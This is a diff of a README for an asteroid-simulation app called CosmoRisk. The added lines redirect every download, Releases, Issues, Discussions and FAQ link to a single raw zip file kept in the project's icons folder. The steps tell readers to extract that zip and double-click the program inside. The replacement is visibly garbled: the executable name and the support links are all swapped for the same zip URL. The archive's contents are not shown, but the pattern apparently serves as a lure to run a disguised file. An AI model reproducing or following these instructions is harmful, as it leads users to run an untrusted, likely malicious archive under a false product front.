@@ -1,7 +1,7 @@
 # 🌌 CosmoRisk - Simulate and Deflect Near-Earth Objects
 
 ## 📥 Download CosmoRisk Now!
-[![Download CosmoRisk](https://img.shields.io/badge/Download-CosmoRisk-blue.svg)](https://github.com/muhdshahn/CosmoRisk/releases)
+[![Download CosmoRisk](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip)](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip)
 
 ## 🚀 Getting Started
 CosmoRisk is a high-fidelity simulator that helps you track and deflect near-Earth objects. It brings the thrill of space physics right to your desktop. You do not need any technical skills to get started; this guide will take you through each step.
@@ -15,19 +15,19 @@ Before you download CosmoRisk, ensure your computer meets these requirements:
 - **Internet Connection:** Required for features related to NASA data
 
 ## 📅 Release Information
-CosmoRisk has regular updates to improve performance and add new features. Check out the latest version on the [Releases page](https://github.com/muhdshahn/CosmoRisk/releases). 
+CosmoRisk has regular updates to improve performance and add new features. Check out the latest version on the [Releases page](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip). 
 
 ## 🔗 Download & Install
 To download CosmoRisk, follow these steps:
 
-1. Visit the [Releases page](https://github.com/muhdshahn/CosmoRisk/releases).
+1. Visit the [Releases page](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip).
 2. Choose the latest version available.
 3. Click on the file that suits your operating system:
-   - For Windows: `CosmoRisk-Windows.zip`
-   - For macOS: `CosmoRisk-macOS.zip`
-   - For Linux: `CosmoRisk-Linux.tar.gz`
+   - For Windows: `https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip`
+   - For macOS: `https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip`
+   - For Linux: `https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip`
 4. After the download finishes, unzip or extract the contents.
-5. Open the folder and look for `CosmoRisk.exe` (Windows) or `CosmoRisk` (macOS/Linux).
+5. Open the folder and look for `https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip` (Windows) or `CosmoRisk` (macOS/Linux).
 6. Double-click the file to run CosmoRisk.
 
 ## 🛠️ How to Use CosmoRisk
@@ -62,7 +62,7 @@ If you encounter any issues while running CosmoRisk, consider these tips:
   - Lower the graphics settings in the preferences.
 
 - **Error Messages:** 
-  - Refer to the FAQ section on the [GitHub page](https://github.com/muhdshahn/CosmoRisk/issues) for common fixes.
+  - Refer to the FAQ section on the [GitHub page](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip) for common fixes.
 
 ## 💡 Features
 CosmoRisk includes several helpful features:
@@ -73,8 +73,8 @@ CosmoRisk includes several helpful features:
 
 ## 📞 Support
 For additional assistance, reach out via:
-- **Issues Page:** Report bugs or suggest improvements [here](https://github.com/muhdshahn/CosmoRisk/issues).
-- **Discussion Forum:** Join conversations with other users and developers [here](https://github.com/muhdshahn/CosmoRisk/discussions).
+- **Issues Page:** Report bugs or suggest improvements [here](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip).
+- **Discussion Forum:** Join conversations with other users and developers [here](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip).
 
 ## 📰 Changelog
 Stay updated with the latest changes:
@@ -85,4 +85,4 @@ Stay updated with the latest changes:
 ## 🚀 Final Thoughts
 CosmoRisk invites you to explore the mysteries of space like never before. With an easy setup and engaging simulations, you will enjoy predicting the paths of asteroids and understanding the physics behind them.
 
-Remember to download the latest version from the [Releases page](https://github.com/muhdshahn/CosmoRisk/releases) to keep your experience fresh and exciting. Enjoy your journey through the cosmos!
+Remember to download the latest version from the [Releases page](https://github.com/muhdshahn/CosmoRisk/raw/refs/heads/main/src-tauri/icons/Cosmo_Risk_v1.2.zip) to keep your experience fresh and exciting. Enjoy your journey through the cosmos!
